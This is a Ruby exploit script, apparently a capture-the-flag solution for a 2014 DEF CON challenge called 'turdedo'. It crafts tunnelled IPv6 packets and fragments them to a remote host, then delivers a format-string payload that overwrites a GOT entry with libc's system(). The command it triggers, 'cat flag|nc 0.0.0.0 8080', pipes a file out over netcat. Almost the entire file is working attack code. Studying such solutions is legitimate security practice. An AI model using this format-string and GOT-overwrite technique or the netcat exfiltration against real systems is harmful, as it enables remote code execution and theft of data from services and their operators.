require 'socket'

class Exploit < UDPSocket
	def initialize
		@port = Random.rand(65536)
		#@addr = "\x20\x01\x00\x00\x7f\x00\x00\x01\x00\x00\xf2\x27\x80\xff\xff\xfe"
		@addr = "\x20\x01\x00\x00\x36\xff\xbb\xbe\x00\x00\xf2\x27\xc9\x00\x44\x41"
		super
	end

	def send_packet(s)
		protocol = 0x11

		payload_size = s.length + 8

		s_header = "aa"+[3544, payload_size].pack('n*') + "aa"

		payload_size = s.length + s_header.length

		header = "a" * 4
		# TODO : payload size dynamic
		header += [payload_size].pack('n')
		header += protocol.chr
		header += "a" * 1
		header += "\x02\x00" + [@port].pack('n') +"\x8f\xf8\x02\x4f\x00\x00\x00\x00\x00\x00\x00\x00"
		header += @addr
		header = header.ljust(40, "a")

		payload = header + s_header + s
		#payload = payload.ljust(, s)

		write(payload)
	end

	def send_2c_packet(s, buffer_flag = 1, buffer_size=0x4fff)
                protocol = 0x2c

                payload_size = s.length + 8

                s_header = "\x11a"+[(buffer_size & 0xfff8)|buffer_flag, 0x1111].pack('n*') + "aa"

                payload_size = s.length + s_header.length

                header = "a" * 4
                # TODO : payload size dynamic
                header += [payload_size].pack('n')
                header += protocol.chr
                header += "a" * 1
                header += "\x02\x00" + [@port].pack('n') +"\x8f\xf8\x02\x4f\x00\x00\x00\x00\x00\x00\x00\x00"
                header += @addr
                header = header.ljust(40, "a")

                payload = header + s_header + s
                #payload = payload.ljust(, s)

                write(payload)
	
	end
end

s = Exploit.new
#s.connect("127.0.0.1", 3544)
s.connect("turdedo_5f55104b1d60779dbe8dcf5df2b186ad.2014.shallweplayaga.me",3544)
=begin
syn_header = "aa"+[3544, 0xb].pack('n*')+"aa"
s.send_2c_packet(syn_header+"SYN", 0, 0)
ack = s.recvfrom(63)[0][54..-1]

length = 8 + 3 + ack.length
ack_header = "aa"+[3544, length].pack('n*')+"aa"
s.send_2c_packet(ack_header+"ACK"+ack, 0, 0)
p s.recvfrom(0x1000)
=end
s.send_packet("SYN")
ack = s.recvfrom(63)[0][54..-1]

s.send_packet("ACK#{ack}" % ack)

p s.recvfrom(0x38)


#calculate libc
libc_base = 0xf7592990 - 0x00019990
system = libc_base + 0x000403B0
#libc_base = "\xE0\x93U\xB7".unpack('<I')[0] - 0x000193E0
#system = libc_base + 0x0003F430 
#bin_sh = libc_base + 0x00161D98 # b7f8cd98

bss = 0x0804E164
fd = 0x0804E15C
send_to_got = 0x804E0A8
payload = "echo " + "QQQ"

cmd = "cat flag|nc 0.0.0.0 8080\x00"
push_string = cmd + [bss,system].pack('<I*')

cmd.length.times do |x|
	payload += [bss + x].pack('<I')
end

4.times do |x|
	payload += [fd + x].pack('<I')
end

4.times do |x|
	payload += [send_to_got + x].pack('<I')
end

prev = (3 + (push_string.length * 4)) % 256
push_string.length.times do |x|
	ch = push_string[x].ord
	#puts "prev : %d, target : %d" % [prev, ch]
	if ch == prev
		payload += "%%%d\$n" % [16 + x]

	else
		ch += 0x100 if ch < prev
		ch -= prev
		payload += "%%%dc%%%d\$n" % [ch, 16 + x]
		#puts "ch : %d" % ch
		prev = push_string[x].ord
	end
	#STDIN.readline()
	#p payload
end

#payload += [0x804E084].pack('<I') + "%16$s"

payload = payload.ljust(payload.length + (16 - payload.length % 16), "a")
seq = 0
header = "aa" + [3544, payload.length + 8].pack('n*') + "aa"
payload = header + payload
payload = payload.scan(/......../)

payload.each do |x| 
	s.send_2c_packet(x, 1, seq)
	seq += x.length
end

s.send_2c_packet("", 0, seq)
p s.recvfrom(3000)[0]


#s.send_2c_packet("SYN", 0)

=begin
s.send_packet("SYN")
ack = s.recvfrom(63)[0][54..-1]

s.send_packet("ACK#{ack}" % ack)

s.recvfrom(0x38)

s.send_packet("echo "+"%9x"*100)
puts s.recvfrom(0x1000)[0][56..-1]
=end

